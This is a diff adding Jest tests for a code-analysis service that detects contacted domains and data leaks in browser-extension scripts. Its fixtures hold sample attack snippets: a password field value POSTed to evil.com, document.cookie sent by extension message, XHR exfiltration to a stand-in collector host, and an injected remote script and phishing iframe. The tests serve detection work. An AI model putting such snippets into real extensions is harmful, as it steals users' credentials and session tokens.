@@ -203,5 +203,89 @@ describe('AstParserService', () => {
       expect(domains.length).toBeGreaterThan(0);
       expect(domains.some((d) => d === 'other.com')).toBe(true);
     });
+
+    it('extracts XHR open URLs and resolves constants', () => {
+      const code = `
+        const host = "collector.evil.xyz";
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://" + host + "/collect");
+        xhr.send("x");
+      `;
+      const domains = service
+        .extractContactedDomains(code, 'background.js')
+        .map((d) => d.domain);
+      expect(domains).toContain('collector.evil.xyz');
+    });
+
+    it('extracts dynamically loaded script and iframe resources as contacts', () => {
+      const code = `
+        const s = document.createElement("script");
+        s.src = "https://cdn.evil.xyz/payload.js";
+        document.documentElement.appendChild(s);
+        const frame = document.createElement("iframe");
+        frame.src = "https://phish.evil.xyz/login";
+        document.body.appendChild(frame);
+      `;
+      const domains = service
+        .extractContactedDomains(code, 'content.js')
+        .map((d) => d.domain);
+      expect(domains).toContain('cdn.evil.xyz');
+      expect(domains).toContain('phish.evil.xyz');
+    });
+  });
+
+  describe('detectDataFlow — stronger taint sources and message hops', () => {
+    it('tracks password field values into fetch', () => {
+      const code = `
+        const password = document.querySelector('input[type="password"]').value;
+        fetch("https://evil.com/collect", { method: "POST", body: password });
+      `;
+      const flows = service.detectDataFlow(code, 'content.js');
+      expect(
+        flows.some((f) => f.description.includes('network sink fetch')),
+      ).toBe(true);
+    });
+
+    it('tracks sensitive page data into extension messages', () => {
+      const code = `
+        const token = document.cookie;
+        chrome.runtime.sendMessage({ token });
+      `;
+      const flows = service.detectDataFlow(code, 'content.js');
+      expect(
+        flows.some((f) =>
+          f.description.includes(
+            'extension message sink chrome.runtime.sendMessage',
+          ),
+        ),
+      ).toBe(true);
+    });
+
+    it('does not treat background-to-tab messages as exfiltration sinks', () => {
+      const code = `
+        chrome.runtime.onMessage.addListener((msg) => {
+          chrome.tabs.sendMessage(1, { value: msg.value });
+        });
+      `;
+      const flows = service.detectDataFlow(code, 'background.js');
+      expect(
+        flows.some((f) =>
+          f.description.includes('extension message sink chrome.tabs.sendMessage'),
+        ),
+      ).toBe(false);
+    });
+  });
+
+  describe('credential keyword calibration', () => {
+    it('does not treat a generic game seed string as a credential', () => {
+      const code = `
+        const adventureSeed = "seed";
+        fetch("https://game.example/sync", { method: "POST", body: adventureSeed });
+      `;
+      const parsed = service.parseFile(code, 'popup/buildAdventurePage.js');
+      expect(
+        parsed.findings.some((f) => f.pattern.includes('credential string')),
+      ).toBe(false);
+    });
   });
 });
